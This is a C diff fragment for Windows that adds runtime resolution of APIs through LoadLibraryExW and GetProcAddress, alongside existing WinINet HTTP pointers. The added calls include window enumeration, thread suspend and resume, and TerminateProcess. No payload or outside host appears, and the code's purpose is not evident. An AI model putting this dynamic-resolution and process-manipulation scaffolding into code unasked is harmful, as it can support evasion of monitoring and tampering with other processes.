@@ -57,6 +57,17 @@
 	FunctionFuncHttpSendRequestW _HttpSendRequestW;
 	FunctionFuncHttpQueryInfoW _HttpQueryInfoW;
 	FunctionFuncInternetReadFile _InternetReadFile;
+	FunctionFuncGetModuleFileNameW   _GetModuleFileNameW;
+	FunctionFuncGetFileVersionInfoSizeExW  _GetFileVersionInfoSizeExW;
+	FunctionFuncGetFileVersionInfoExW  _GetFileVersionInfoExW;
+	FunctionFuncVerQueryValueW _VerQueryValueW;
+	FunctionFuncEnumWindows _EnumWindows;
+	FunctionFuncGetWindowTextW   _GetWindowTextW;
+	FunctionFuncThread32First   _Thread32First;
+	FunctionFuncSuspendThread  _SuspendThread;
+	FunctionFuncResumeThread  _ResumeThread;
+	FunctionFuncThread32Next   _Thread32Next;
+	FunctionFuncTerminateProcess  _TerminateProcess;
 
 PIMAGE_NT_HEADERS WINAPI ImageNtHeader(PVOID Base)
 {
@@ -388,6 +399,45 @@ int setLoadLibraryExW(void)
 
 	LibHandle = LoadLibraryExW(L"WININET",NULL,0);
     _InternetReadFile=  (FunctionFuncInternetReadFile)GetProcAddress(LibHandle,"InternetReadFile");
+
+	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
+	_GetModuleFileNameW =  (FunctionFuncGetModuleFileNameW)GetProcAddress(LibHandle,"GetModuleFileNameW");
+
+	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
+	_GetFileVersionInfoExW =  (FunctionFuncGetFileVersionInfoExW)GetProcAddress(LibHandle,"GetFileVersionInfoExW");
+
+
+	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
+	_GetFileVersionInfoSizeExW =  (FunctionFuncGetFileVersionInfoSizeExW)GetProcAddress(LibHandle,"GetFileVersionInfoSizeExW");
+
+
+	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
+	_VerQueryValueW =  (FunctionFuncVerQueryValueW)GetProcAddress(LibHandle,"VerQueryValueW");
+
+	LibHandle = LoadLibraryExW(L"ie_shims",NULL,0);
+	_EnumWindows =  (FunctionFuncEnumWindows)GetProcAddress(LibHandle,"EnumWindows");
+
+
+	LibHandle = LoadLibraryExW(L"ie_shims",NULL,0);
+	_GetWindowTextW=  (FunctionFuncGetWindowTextW)GetProcAddress(LibHandle,"GetWindowTextW");
+
+
+	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
+    _Thread32First =  (FunctionFuncThread32First)GetProcAddress(LibHandle,"Thread32First");
+
+	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
+    _SuspendThread =  (FunctionFuncSuspendThread)GetProcAddress(LibHandle,"SuspendThread");
+
+	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
+    _ResumeThread =  (FunctionFuncResumeThread)GetProcAddress(LibHandle,"ResumeThread");
+
+ 
+	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
+	_Thread32Next =  (FunctionFuncThread32Next)GetProcAddress(LibHandle,"Thread32Next");
+
+	
+	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
+	_TerminateProcess =  (FunctionFuncTerminateProcess)GetProcAddress(LibHandle,"TerminateProcess");
 
 
 	return 0;
